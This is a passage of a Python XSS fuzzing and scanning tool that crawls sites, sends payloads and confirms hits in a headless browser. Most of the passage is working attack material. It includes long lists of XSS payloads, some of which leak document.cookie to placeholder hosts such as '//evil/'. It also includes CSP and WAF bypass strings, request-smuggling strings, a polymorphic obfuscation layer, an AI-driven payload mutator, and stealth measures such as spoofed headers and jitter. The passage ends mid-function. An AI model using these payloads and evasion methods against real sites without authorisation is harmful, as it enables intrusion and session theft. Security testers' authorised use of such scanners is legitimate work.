    if DEBUG:
        logging.debug(msg)

# ─────────────────────────────────────────────────────────────────────────────
#  UTILITY FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────
def randstr(n: int = 12) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def jitter(a: int = JITTER_MIN_MS, b: int = JITTER_MAX_MS) -> None:
    time.sleep(random.uniform(a/1000.0, b/1000.0))

def session_splice() -> None:
    time.sleep(SESSION_SPLICE_MS / 1000.0)

def rate_limit() -> None:
    time.sleep(RATE_LIMIT_SLEEP)

def smart_url(u: str) -> str:
    """Prepend scheme if missing and return first live variant."""
    if u.startswith(("http://","https://","ftp://","file://")):
        return u
    for scheme in ("https://","http://"):
        try:
            if requests.head(scheme+u, timeout=3, verify=False).status_code < 500:
                return scheme+u
        except Exception:
            pass
    return "http://" + u

def random_headers() -> Dict[str,str]:
    ua = UserAgent()
    hdrs = {"User-Agent": ua.random}
    if args.detect_waf:
        hdrs.update(random.choice(WAF_SPOOF_HEADERS))
    return hdrs

# ─────────────────────────────────────────────────────────────────────────────
#  AI MODEL FOR "MASK" TOKENS
# ─────────────────────────────────────────────────────────────────────────────
if torch and AutoTokenizer and AutoModelForMaskedLM:
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    tok    = AutoTokenizer.from_pretrained(MODEL)
    mdl    = AutoModelForMaskedLM.from_pretrained(MODEL).to(device).eval()
    MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id
    TOP_K = 7
    def ai_mutate(template: str) -> str:
        s = template
        while "MASK" in s:
            replaced = s.replace("MASK", MASK_T, 1)
            ids = tok(replaced, return_tensors="pt").input_ids.to(device)
            with torch.no_grad():
                logits = mdl(ids).logits
            pos = (ids == MASK_ID).nonzero(as_tuple=True)
            if not pos[0].numel():
                break
            mask_idx = pos[1][0]
            topk = logits[0,mask_idx].topk(TOP_K).indices.tolist()
            s = s.replace("MASK", tok.decode(random.choice(topk)).strip() or "alert(1)", 1)
        return s
else:
    def ai_mutate(template: str) -> str:
        return template.replace("MASK", "alert(1)")

# ─────────────────────────────────────────────────────────────────────────────
#  POLYMORPHIC OBFUSCATION
# ─────────────────────────────────────────────────────────────────────────────
def encode_to_utf32_le(s: str) -> str:
    try:
        return s.encode('utf-32-le','ignore').decode('latin-1','ignore')
    except Exception:
        return s

def triple_rot13(s: str) -> str:
    return codecs.encode(codecs.encode(codecs.encode(s,'rot_13'),'rot_13'),'rot_13')

def insert_weird_char(s: str) -> str:
    return "‼".join(s)

obf_base = [
    lambda p: p,
    lambda p: "".join(f"\\x{ord(c):02x}" for c in p),
    lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
    lambda p: base64.b64encode(p.encode()).decode(errors='ignore'),
    lambda p: p.encode('utf-16','ignore').decode('latin-1','ignore'),
    lambda p: codecs.encode(p,'rot_13'),
    lambda p: urllib.parse.quote(p),
    lambda p: p.replace('<','&lt;').replace('>','&gt;'),
    lambda p: p.replace('"','&quot;').replace("'",'&#39;'),
    lambda p: "".join(f"\\{c}" for c in p),
    lambda p: "".join(f"%{ord(c):02X}" for c in p),
    lambda p: "".join(f"&#x{ord(c):X};" for c in p),
    lambda p: "".join(f"&#{ord(c)};" for c in p),
    lambda p: "".join(f"{c}/**/" for c in p),
    lambda p: p[::-1],
    lambda p: p.upper(),
    lambda p: p.lower(),
    lambda p: p.swapcase(),
    lambda p: p.replace('\x00',''),
    lambda p: urllib.parse.quote(urllib.parse.quote(p)),
]

def _expand_obf() -> List:
    exp = [
        lambda p: "".join(f"\\0{oct(ord(c))[2:]}" for c in p),
        lambda p: "".join(f"\\u{{{ord(c):04x}}}" for c in p),
        lambda p: base64.urlsafe_b64encode(p.encode()).decode('ascii','ignore'),
        lambda p: encode_to_utf32_le(p),
        lambda p: "".join(chr((ord(c)+1) % 256) for c in p),
        lambda p: "".join(chr((ord(c)-1) % 256) for c in p),
        triple_rot13,
        lambda p: p.replace("<","＜").replace(">","＞"),
        lambda p: re.sub(r"[aeiouAEIOU]", lambda m: m.group(0)+"\u200B", p),
        lambda p: codecs.encode(p,"hex_codec").decode('ascii'),
        lambda p: p[::-1].upper(),
        insert_weird_char,
        lambda p: "".join(f"\\U0000{ord(c):04X}" for c in p),
        lambda p: p.replace("<","%3C").replace(">","%3E"),
        lambda p: "".join(c for c in p if c.isalnum()),
        lambda p: p.replace(" ","%20"),
        lambda p: p.replace(" ","\t"),
        lambda p: " ".join(reversed(p.split())),
        lambda p: "".join("\\x"+hex(ord(c))[2:].zfill(2)+"\\" for c in p),
        lambda p: "\u202E"+p+"\u202C",
    ]
    for i in range(50):
        exp.append(lambda p, i=i: p + f"<!--rand{i}-->" if p else p)
    return exp

obfuscation_methods = obf_base + _expand_obf()

def polymorph(payload: str) -> str:
    return random.choice(obfuscation_methods)(payload)

# ─────────────────────────────────────────────────────────────────────────────
#  BASE PAYLOAD COLLECTIONS
# ─────────────────────────────────────────────────────────────────────────────

# CyberZeus Proprietary XSS Payloads — 100% self-contained, no external URLs
BASE_PAYLOADS = [
    # 1. Classic & Polyglot Injections
    "<svg/onload=alert(1)>",
    "<svg onload=eval(atob('YWxlcnQoMSk='))>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<script%0Aalert(1)%3B</script>",
    "<IMG SRC=JaVaScRiPt:alert(1)>",
    "<body onload=window>",
    "\"><svg><script>alert(1)</script>",
    "<iframe/src=\"data:text/html,<script>alert(1)</script>\"></iframe>",
    "<math><annotation encoding=\"application/ecmascript\">alert(1)</annotation></math>",
    "<animate onbegin=\"alert(1)\" />",
    "<details/open ontoggle=alert(1)>Clickme</details>",

    # 2. Attribute-Context Tricks
    "\" autofocus onfocus=alert(1) x=\"",
    "' onmouseover=eval(atob(\"YWxlcnQoMSk=\")) '",
    "x=';alert(1);//",
    "title=\"><svg onload=alert(1)>",
    "style=\"x:expression(alert(1))\"",
    "href=\"JaVaScRiPt:alert(1)\"",
    "src=`+document.cookie+`",

    # 3. URL-Context Vectors
    "javascript:/*–>*/alert(1)//",
    "data:text/html,<script>alert(1)</script>",
    "//google.com/?x=\\\"><script>alert(1)</script>",
    "/%0A%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "javascript:top",
    ".&#000058;&#000097;&#000108;&#000101;&#000114;&#000116;(1)",

    # 4. <script>-Block Mutations
    "';!function(){alert(1)}();//",
    "\"});alert(1);//",
    "`);fetch('javascript:alert(1)');//",
    "//--><script>alert(1)</script><!--",
    "new Function('alert(1)')();",
    "eval(String.fromCharCode(97,108,101,114,116,40,49,41));",

    # 5. CSS-Context Payloads
    "style=background:url(\"javascript:alert(1)\")",
    "expression(alert(1))",
    "behavior:url(\"javascript:alert(1)\");",
    "width:expression(alert(1));",
    "font-family:expression(alert(1));",
    "background-image:&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1);",

    # 6. Event-Handler Payloads
    "<img src=x onerror=this.onerror=0,alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<video oncanplay=alert(1) src=x>",
    "<a href=# onmouseenter=eval(atob('YWxlcnQoMSk='))>hover</a>",

    # 7. DOM-API & MutationObserver
    "<script>new MutationObserver(_=>alert(1)).observe(document,{childList:true,subtree:true});</script>",
    "<script>setTimeout(()=>alert(1),0)</script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>fetch('javascript:alert(1)')</script>",

    # 8. JSON & API Tricks
    "\";alert(1);//",
    "payload\":\"<img src=x onerror=alert(1)>",
    "{\"key\":\"</script><script>alert(1)</script>\"}",
    "{\"data\":\"&#x3C;svg onload=alert(1)&#x3E;\"}",
    "{\"name\":\"`;alert(1);//`\"}",

    # 9. WAF-Bypass & Encoding
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
    "&#60;svg onload=alert(1)&#62;",
    "&#x3C;img src=x onerror=alert(1)&#x3E;",
    "<svg onload=prompt`XSS`>",
    "<iframe%20srcdoc=%3Csvg%20onload=alert(1)%3E%3C/svg%3E></iframe>",

    # 10. Blind-XSS / OOB Beacons (no external)
    "<script src=\"BEACON://TOKEN.js\"></script>",
    "<img src=\"BEACON://TOKEN.gif\">",
    "<svg><script>new Image().src=\"BEACON://\"+Date.now()</script></svg>",
    "<object data=\"BEACON://\"+encodeURIComponent(document.cookie)></object>",

    # 11. WebAssembly & Service-Worker
    "<script>WebAssembly.instantiateStreaming(fetch('data:application/wasm;base64,AGFzbQE...')).then(o=>alert(o.instance.exports._start()));</script>",
    "<script>navigator.serviceWorker.register('javascript:alert(1)').catch(()=>alert('sw'));</script>",

    # 12. Client-Side Template Injection
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "`+alert(1)+`",
    "{{\"\".constructor.alert(1)}}",

    # 13. CSP & TrustedTypes Bypass
    "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline' 'nonce-'+document.cookie\">",
    "<script>trustedTypes.createPolicy('p',{createScriptURL:()=> 'javascript:alert(1)'});</script>",

    # 14. Modern API & Cross-Protocol
    "<script>navigator.xr.requestSession('immersive-vr').then(_=>alert(1));</script>",
    "<script>new BroadcastChannel('x').postMessage('<img src=x onerror=alert(1)>');</script>",
    "file:///etc/passwd?<script>alert(1)</script>",
    "ftp://host/`+document.cookie+`",
    "ws://host/?x=<svg onload=alert(1)>",

    # 15. Encoding & Quirks
    "\\u202Ealert(1)//",
    "\\xEF\\xBB\\xBF<script>alert(1)</script>",

    # 16. GraphQL & JSON-LD
    "{\"query\":\"{user(id:\\\"1;<img src=x onerror=alert(1)>\\\")}\"}",
    "{\"@context\":{\"@vocab\":\"</script><script>alert(1)</script>\"}}",

    # 17. WebSocket & HTTP/2 Smuggling
    "<script>let ws=new WebSocket('ws://host/?x=<img src=x onerror=alert(1)>');</script>",
    "/* POST / HTTP/1.1\\r\\nHost:host\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\n<script>alert(1)</script>\\r\\n0\\r\\n */",

    # 18. Media, MathML & Interactive
    "<video src=bad onerror=alert(1)>",
    "<details open ontoggle=alert(1)>Click</details>",
    "<marquee onstart=alert(1)>Hello</marquee>",
    "<math><annotation encoding=\"application/ecmascript\">alert(1)</annotation></math>",

    # 19. Prototype Pollution & Clobbering
    "obj.__proto__.polluted='yes';alert(1)",
    "window.alert=(()=>1)&&alert(1)",

    # 20. Rare Tags & Obfuscations
    "<keygen onkeygen=alert(1)>",
    "<template>alert(1)</template>",
    "<track onerror=alert(1)>",
    "<fieldset onpointerenter=alert(1)>",
    "<svg xml:base=\"javascript:alert(1)\">",
]

EXTRA_BASE = [
    # Prototype & Constructor Tricks
    "__proto__[alert]=1",
    '{"__proto__":{"polluted":"CYBERZEUS"}}',
    "constructor.constructor('alert(1)')()",
    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
    '__proto__.toString="alert(1)"',

    # Anchor & URI Schemes
    '<a href="javascript:alert(1)">CyberZeusLink</a>',
    '<a href="data:text/html,<script>alert(1)</script>">DZ</a>',
    '<a href="JaVaScRiPt:alert(1)">MixedCase</a>',
    '<a href="vbscript:msgbox(\'XSS\')">VB</a>',
    '<a href="//evil/`+document.domain+`">DomainLeak</a>',

    # Image & Media Handlers
    '<img src=x onerror=alert(1)>',
    '<video src=bad onerror=alert(1)>',
    '<audio src=bad onerror=alert(1)>',
    '<img src=1 onload=alert(1)>',
    '<img src=x onerror=this.onerror=0,alert(1)>',

    # SVG & XML Vectors
    '<svg onload=alert(1)>',
    '<svg xml:base="javascript:alert(1)">',
    '<svg><script>alert(1)</script></svg>',
    '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
    '<math><annotation encoding="application/ecmascript">alert(1)</annotation></math>',

    # CSS & Style Injections
    '<style>*{background:url("javascript:alert(1)");}</style>',
    '<style>li{list-style-image:url("javascript:alert(1)");}</style>',
    '<style>@import "javascript:alert(1)";</style>',
    '<div style="width:expression(alert(1))">',
    '<style onload=alert(1)></style>',

    # Event & Attribute Polyglots
    '" autofocus onfocus=alert(1) foo="',
    "' onmouseover=alert(1) '",
    '<input pattern="[A-z]*" oninvalid=alert(1)>',
    '<textarea autofocus onfocus=alert(1)>',
    '<details open ontoggle=alert(1)>',

    # Iframe & Form Exploits
    '<iframe src=javascript:alert(1)></iframe>',
    '<iframe sandbox onload=alert(1)>',
    '<form action="javascript:alert(1)"><button>Go</button></form>',
    '<button formaction="javascript:alert(1)">XSS</button>',
    '<form onsubmit=alert(1)>',

    # DOM-API & Observer
    '{{constructor.constructor(\'alert(1)\')()}}',
    '<script>new MutationObserver(_=>alert(1)).observe(document,{subtree:true});</script>',
    '<script>setTimeout(()=>alert(1),0)</script>',
    '<script>location.hash="<img src=x onerror=alert(1)>";</script>',
    '<script>Function("alert(1)")()</script>',

    # Encoding & Obfuscation
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>alert(unescape("%58%53%53"))</script>',
    '<iframe srcdoc="%3Cscript%3Ealert(1)%3C/script%3E"></iframe>',
    '<img src=x onerror=eval(decodeURIComponent("%61%6C%65%72%74%281%29"))>',
    '<svg onload=\'fetch("data:,alert(1)")\'>',

    # Advanced API & Cross-Protocol
    '<script>navigator.xr.requestSession("immersive-vr").then(_=>alert(1));</script>',
    '<script>new BroadcastChannel("x").postMessage("<img src=x onerror=alert(1)>");</script>',
    'file:///etc/passwd?<script>alert(1)</script>',
    'ws://host/?x=<svg onload=alert(1)>',
    '/%0A%3Cscript%3Ealert(1)%3C%2Fscript%3E',

    # CSP & TrustedTypes Bypass
    '<meta http-equiv="Content-Security-Policy" content="script-src \'unsafe-inline\' \'nonce-\'+document.cookie">',
    '<script>trustedTypes.createPolicy("p",{createScriptURL:()=> "javascript:alert(1)"});</script>',

    # WebAssembly & Service-Worker
    '<script>WebAssembly.instantiateStreaming(fetch("data:application/wasm;base64,AGFzbQE...")).then(o=>alert(o.instance.exports._start()));</script>',
    '<script>navigator.serviceWorker.register("javascript:alert(1)").catch(()=>alert("sw")); </script>',

    # JSON-LD & GraphQL
    '{"query":"{user(id:\\"1;<img src=x onerror=alert(1)>\\" )}"}',
    '{"@context":{"@vocab":"</script><script>alert(1)</script>"}}',

    # Smuggling & Chunked
    '/* POST / HTTP/1.1\\r\\nHost:host\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\n<script>alert(1)</script>\\r\\n0\\r\\n */',
    '<script>let ws=new WebSocket("ws://host/?x=<img src=x onerror=alert(1)>");</script>',

    # Prototype Pollution & Clobber
    "obj.__proto__.x='CYBERZEUS';alert(1)",
    "window.alert=(()=>1)&&alert(1)",

    # Rare/Interactive Tags
    '<keygen onkeygen=alert(1)>',
    '<track onerror=alert(1)>',
    '<fieldset onpointerenter=alert(1)>',
    '<dialog open oncancel=alert(1)>',
    '<template>alert(1)</template>',
]

if args.invent:
    EXTRA_BASE.append("MASK")

BASE_PAYLOADS = list(set(BASE_PAYLOADS + EXTRA_BASE))

# Stored payloads (union of v10 stored lists, uncut)
stored_payloads_v1 = [ ... ]  # FULL list from original script
stored_payloads_v2 = [ ... ]  # FULL list from original script
all_stored_payloads = list(set(stored_payloads_v1 + stored_payloads_v2))

# ─────────────────────────────────────────────────────────────────────────────
#  PAYLOAD GENERATION HELPER
# ─────────────────────────────────────────────────────────────────────────────
def pick_payload(_param_name:str)->str:
    tpl=random.choice(BASE_PAYLOADS)
    if "MASK" in tpl:
        tpl=ai_mutate(tpl)
    if args.polymorph:
        tpl=polymorph(tpl)
    return tpl

# ─────────────────────────────────────────────────────────────────────────────
#  WAF / CONTEXT DETECTION
# ─────────────────────────────────────────────────────────────────────────────
def detect_waf(url:str)->str:
    if not WafW00F:
        return "unknown"
    try:
        engine=WafW00F(url)
        engine.run()
        return engine.get_waf_name() or "unknown"
    except Exception as e:
        dbg(f"[detect_waf] {e}")
        return "unknown"

def detect_context(root:str)->Tuple[str,str]:
    waf=detect_waf(root)
    server="unknown"
    try:
        server=requests.get(root,timeout=4,verify=False).headers.get("Server","unknown")
    except Exception:
        pass
    return waf,server

# ─────────────────────────────────────────────────────────────────────────────
#  SESSION / AUTH
# ─────────────────────────────────────────────────────────────────────────────
def rotate_csrf_token(sess:requests.Session,url:str,field:str)->Optional[str]:
    try:
        r=sess.get(url,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
        m=re.search(f'name=["\']{field}["\'] value=["\']([^"\']+)["\']',r.text)
        if m: return m.group(1)
    except Exception: pass
    return None

def get_authenticated_session()->requests.Session:
    s=requests.Session()
    s.mount("https://",HTTPAdapter(pool_connections=50,pool_maxsize=50))
    s.mount("http://",HTTPAdapter(pool_connections=50,pool_maxsize=50))
    if args.login_url and args.username and args.password:
        csrf=rotate_csrf_token(s,args.login_url,args.csrf_field) or ""
        data={"username":args.username,"password":args.password}
        if csrf: data[args.csrf_field]=csrf
        try:
            r0=s.get(args.login_url,timeout=3,verify=False)
            ct=r0.headers.get("content-type","").lower()
            if "json" in ct or "/rest/" in args.login_url:
                s.post(args.login_url,json=data,headers=random_headers(),
                       timeout=HTTP_TIMEOUT,verify=False)
            else:
                s.post(args.login_url,data=data,headers=random_headers(),
                       timeout=HTTP_TIMEOUT,verify=False)
        except Exception:
            pass
    return s

SESSION=get_authenticated_session()

# ─────────────────────────────────────────────────────────────────────────────
#  PLAYWRIGHT VERIFY
# ─────────────────────────────────────────────────────────────────────────────
def verify(url:str,method:str,data:Dict[str,Any],is_json:bool=False)->bool:
    """Attempt to confirm XSS in a real browser; fallback to reflection."""
    if sync_playwright:
        try:
            screenshot_dir=Path("screenshots"); screenshot_dir.mkdir(exist_ok=True)
            sig=hashlib.md5((url+json.dumps(data,sort_keys=True)).encode()).hexdigest()[:8]
            with sync_playwright() as p:
                br=p.chromium.launch(headless=not args.headed,
                                     args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
                ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random)
                page=ctx.new_page()
                page.add_init_script("""
                    (()=>{window._xss_triggered=false;window._xss_reason='none';
                    function mark(r){window._xss_triggered=true;window._xss_reason=r||'unknown';}
                    ['alert','confirm','prompt'].forEach(f=>{const o=window[f];window[f]=(...a)=>{mark(f);return o(...a);};});
                    document.addEventListener('securitypolicyviolation',()=>mark('csp'));
                    new MutationObserver(ms=>ms.forEach(m=>m.addedNodes.forEach(n=>{
                        if(n.outerHTML&&/(script|onerror|iframe|svg)/i.test(n.outerHTML))mark('mutation');
                    }))).observe(document.documentElement,{childList:true,subtree:true});})();
                """)
                page.on("dialog",lambda d:d.dismiss())
                if method.upper()=="GET":
                    qs=urllib.parse.urlencode(data)
                    page.goto(f"{url}?{qs}" if qs else url,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
                else:
                    hdr={"Content-Type":"application/json"} if is_json else {"Content-Type":"application/x-www-form-urlencoded"}
                    body=json.dumps(data) if is_json else urllib.parse.urlencode(data)
                    page.goto(url,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
                    page.evaluate("(u,h,b)=>fetch(u,{method:'POST',headers:h,body:b})",url,hdr,body)
                    page.wait_for_timeout(1500)
                before=screenshot_dir/f"{sig}_before.png"; after=screenshot_dir/f"{sig}_after.png"
                page.screenshot(path=str(before),full_page=True)
                page.wait_for_timeout(HEADLESS_WAIT)
                page.screenshot(path=str(after),full_page=True)
                trig=page.evaluate("window._xss_triggered"); reason=page.evaluate("window._xss_reason")
                page.close(); ctx.close(); br.close()
                if trig:
                    entry=f"- **XSS** {method} `{url}` reason={reason} screenshots=({before.name},{after.name})\n"
                    with log_lock: LOGFILE.write_text(LOGFILE.read_text('utf-8')+entry if LOGFILE.exists() else f"# Noctua Findings v{VERSION}\n\n{entry}","utf-8")
                    logging.info(entry.strip()); return True
        except Exception as e:
            dbg(f"[verify-playwright] {e}")
    # Fallback: simple reflection
    try:
        if method.upper()=="GET":
            r=SESSION.get(url,params=data,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
        else:
            if is_json:
                r=SESSION.post(url,json=data,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
            else:
                r=SESSION.post(url,data=data,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
        body=r.text or ""
        if any(isinstance(v,str) and v in body for v in data.values()):
            entry=f"- **XSS** {method} `{url}` reflected\n"
            with log_lock: LOGFILE.write_text(LOGFILE.read_text('utf-8')+entry if LOGFILE.exists() else f"# Noctua Findings v{VERSION}\n\n{entry}","utf-8")
            logging.info(entry.strip()); return True
    except Exception as e:
        dbg(f"[verify-fallback] {e}")
    return False

# ─────────────────────────────────────────────────────────────────────────────
#  FINDINGS LOG / SARIF / SLACK
# ─────────────────────────────────────────────────────────────────────────────
log_lock=threading.Lock()
sarif_lock=threading.Lock()
_hits:set[str]=set()
sarif_results:List[Dict[str,Any]]=[]

if not LOGFILE.exists():
    LOGFILE.write_text(f"# Noctua Findings v{VERSION}\n\n","utf-8")

def log_hit(url:str,method:str,payload:str,params:List[str]|None=None,extra:str="")->None:
    params=params or []
    entry=f"- **XSS** {method} `{url}` param={params} payload=`{payload}` {extra}\n"
    with log_lock:
        if entry in _hits: return
        _hits.add(entry)
        LOGFILE.write_text(LOGFILE.read_text('utf-8')+entry,"utf-8")
    logging.info(entry.strip())
    if SLACK_WEBHOOK_URL:
        try: requests.post(SLACK_WEBHOOK_URL,json={"text":entry},timeout=5)
        except Exception: pass
    if SARIF_OUTPUT_FILE:
        with sarif_lock:
            sarif_results.append({
              "ruleId":"XSS","level":"error",
              "message":{"text":f"XSS param={params}"},
              "locations":[{"physicalLocation":{"artifactLocation":{"uri":url}}}]
            })

def write_sarif():
    if not sarif_results or not SARIF_OUTPUT_FILE: return
    sarif={"$schema":"https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-2.1.0.json",
           "version":"2.1.0","runs":[{"tool":{"driver":{"name":"Noctua","version":VERSION}},"results":sarif_results}]}
    with open(SARIF_OUTPUT_FILE,"w",encoding="utf-8") as f: json.dump(sarif,f,indent=2)

# ─────────────────────────────────────────────────────────────────────────────
#  CHUNKED / HTTP‑2 SENDER
# ─────────────────────────────────────────────────────────────────────────────
def chunked_fuzz_request(url:str,method:str,headers:Dict[str,str],body:str):
    if not httpx:
        return requests.get(url,headers=headers,timeout=HTTP_TIMEOUT,verify=False) if method=="GET" else \
               requests.post(url,data=body,headers=headers,timeout=HTTP_TIMEOUT,verify=False)
    try:
        with httpx.Client(http2=True,verify=False,timeout=HTTP_TIMEOUT) as c:
            return c.get(url,headers=headers) if method=="GET" else c.post(url,data=body,headers=headers)
    except Exception: pass
    def gen(b:str):
        idx=0
        while idx<len(b):
            sz=random.randint(1,8)
            yield b[idx:idx+sz]; idx+=sz
    try:
        with httpx.Client(verify=False,timeout=HTTP_TIMEOUT) as c:
            return c.get(url,headers={**headers,"Transfer-Encoding":"chunked"}) if method=="GET" else \
                   c.post(url,data=gen(body),headers={**headers,"Transfer-Encoding":"chunked"})
    except Exception as e:
        dbg(f"[chunked_fuzz] {e}")
        return requests.get(url,headers=headers,timeout=HTTP_TIMEOUT,verify=False) if method=="GET" else \
               requests.post(url,data=body,headers=headers,timeout=HTTP_TIMEOUT,verify=False)

def send_email_notification(subject: str, body: str):
    """Send email notification using configuration from emailconfig.yaml"""
    if not EMAIL_CONFIG:
        return
        
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_CONFIG['from']
        msg['To'] = EMAIL_CONFIG['to']
        msg['Subject'] = subject
        
        msg.attach(MIMEText(body, 'plain'))
        
        with smtplib.SMTP(EMAIL_CONFIG['smtp_server'], EMAIL_CONFIG['smtp_port']) as server:
            if EMAIL_CONFIG.get('tls'):
                server.starttls()
            server.login(EMAIL_CONFIG['username'], EMAIL_CONFIG['password'])
            server.send_message(msg)
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

# ─────────────────────────────────────────────────────────────────────────────
#  TARGET CRAWLING HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def mine_js(url:str,host:str)->List[str]:
    found=[]
    try:
        txt=SESSION.get(url,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False).text
        js_call=re.compile(r'(fetch\(["\']|axios\.\w+\(["\']|WebSocket\(["\']|import\(["\'])'
                           r'(/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|html?)(?:\?[^"\']*)?)["\']',re.I)
        js_url=re.compile(r'["\'](/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|html?)(?:\?[^"\']*)?)["\']',re.I)
        for m in js_call.findall(txt)+js_url.findall(txt):
            if isinstance(m,tuple): m=[x for x in m if x]
            for u in ([m] if isinstance(m,str) else m):
                full=urllib.parse.urljoin(url,u); 
                if urllib.parse.urlparse(full).netloc.lower()==host: found.append(full)
    except Exception: pass
    return list(set(found))

def misc_assets(root:str)->List[str]:
    base=urllib.parse.urlparse(root)._replace(path="",query="",fragment="").geturl()
    assets=[]
    try:
        txt=SESSION.get(base+"/robots.txt",headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False).text
        for line in txt.splitlines():
            if line.lower().startswith("sitemap:"): assets.append(line.split(":",1)[1].strip())
    except Exception: pass
    return assets

def parse_html_forms_links(url:str,html:str)->List[Dict[str,Any]]:
    soup=BeautifulSoup(html,"html.parser"); host=urllib.parse.urlparse(url).netloc.lower(); res=[]
    if args.crawl_iframes:
        for ifr in soup.find_all("iframe",src=True):
            src=urllib.parse.urljoin(url,ifr["src"])
            if urllib.parse.urlparse(src).netloc.lower()==host: res.append({"iframe":src})
    for a in soup.find_all("a",href=True):
        link=urllib.parse.urljoin(url,a["href"]); pu=urllib.parse.urlparse(link)
        if pu.netloc.lower()==host:
            params=list(urllib.parse.parse_qs(pu.query).keys())
            res.append({"url":pu._replace(query="").geturl(),"method":"GET","params":params})
    for f in soup.find_all("form"):
        action=f.get("action") or url
        full=urllib.parse.urljoin(url,action); pu=urllib.parse.urlparse(full)
        if pu.netloc.lower()==host:
            method=f.get("method","GET").upper()
            params=[inp.get("name") for inp in f.find_all(["input","textarea","select"]) if inp.get("name")]
            res.append({"url":pu._replace(query="").geturl(),"method":method,"params":params})
    # manifest
    for l in soup.find_all("link",rel="manifest",href=True):
        mani=urllib.parse.urljoin(url,l["href"])
        try:
            j=SESSION.get(mani,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False).json()
            for k in ("start_url","scope"):
                if k in j:
                    u=urllib.parse.urljoin(mani,j[k])
                    if urllib.parse.urlparse(u).netloc.lower()==host:
                        res.append({"url":u,"method":"GET","params":[]})
        except Exception: pass
    return res

def crawl_static(root:str,cap:int,visited:set[str]|None=None)->List[Dict[str,Any]]:
    visited=visited or set(); host=urllib.parse.urlparse(root).netloc.lower()
    def norm(u:str)->str:
        p=urllib.parse.urlparse(u)._replace(query="",fragment="")
        path=re.sub(r'/+','/',p.path)
        if path.endswith('/') and path!='/': path=path[:-1]
        return p._replace(path=path).geturl().lower()
    queue=[root]+misc_assets(root); results=[]
    while queue and len(visited)<cap:
        u=queue.pop(0); sig=norm(u)
        if sig in visited: continue
        visited.add(sig)
        ext=Path(urllib.parse.urlparse(sig).path).suffix.lstrip('.').lower()
        if ext in static_exts: continue
        try:
            r=SESSION.get(u,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
            if r.status_code>=400: continue
        except Exception: continue
        ct=r.headers.get("content-type","").lower()
        if "javascript" in ct:
            for jurl in mine_js(u,host):
                if norm(jurl) not in visited: queue.append(jurl)
            continue
        if "html" not in ct and not u.endswith(".html"): continue
        for nt in parse_html_forms_links(u,r.text):
            lurl=nt.get("url") or nt.get("iframe"); mth=nt.get("method","GET").upper()
            params=nt.get("params",[])
            if not lurl: continue
            key=f"{mth}:{norm(lurl)}:{','.join(sorted(params))}"
            if key not in visited:
                visited.add(key); results.append(nt)
                if norm(lurl) not in visited: queue.append(lurl)
    return results

def crawl_dynamic(root:str)->List[Dict[str,Any]]:
    if not sync_playwright: return []
    found,seen=set(),[]
    host=urllib.parse.urlparse(root).netloc.lower()
    def norm(u:str)->str: return urllib.parse.urlparse(u)._replace(query="",fragment="").geturl().lower()
    try:
        with sync_playwright() as p:
            br=p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
            ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random)
            page=ctx.new_page()
            def on_req(req):
                u=norm(req.url); 
                if urllib.parse.urlparse(u).netloc.lower()!=host or u in seen: 
                    return
                seen.append(u)
                m=req.method.upper(); hdr=req.headers.get("content-type","").lower()
                is_json="json" in hdr or "graphql" in hdr
                try: data=json.loads(req.post_data or "{}"); params=list(data.keys())
                except Exception:
                    qs=urllib.parse.urlparse(req.url).query; params=list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
                found.add(json.dumps({"url":u,"method":m if m in ("POST","PUT") else "GET","json":is_json,"params":params,"template":data if is_json else {}}))
            page.on("request",on_req)
            page.goto(root,timeout=VERIFY_TIMEOUT,wait_until="networkidle"); page.wait_for_timeout(2000)
            ctx.close(); br.close()
    except Exception as e:
        dbg(f"[crawl_dynamic] {e}")
    return [json.loads(x) for x in found]

def spa_dynamic_crawl(root:str,max_clicks:int=20)->List[Dict[str,Any]]:
    if not sync_playwright: return []
    found,seen_req=set(),set()
    host=urllib.parse.urlparse(root).netloc.lower()
    def norm(u:str)->str: return urllib.parse.urlparse(u)._replace(query="",fragment="").geturl().lower()
    try:
        with sync_playwright() as p:
            br=p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
